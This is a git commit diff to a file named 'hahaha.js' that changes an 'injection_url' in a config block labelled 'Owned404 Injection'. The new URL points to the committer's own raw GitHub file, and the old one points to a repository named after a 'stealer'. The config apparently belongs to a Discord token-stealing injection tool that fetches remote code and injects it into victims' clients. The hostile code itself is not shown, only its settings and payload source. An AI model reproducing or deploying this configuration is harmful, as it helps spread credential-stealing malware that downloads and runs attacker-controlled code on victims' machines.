9de5d9f1256ea3a1ce996930b3b07379d041ef51
drainweb404 <157326776+drainweb404@users.noreply.github.com>
2024-02-19 14:16:04 -0300

    Update hahaha.js

--- hahaha.js
+++ hahaha.js
@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Owned404 Injection', 
   embed_icon: 'https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/wtfcstealerwtf/index/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/drainweb404/encryptedfuck/main/hahaha.js', 
   /**
    
    **/
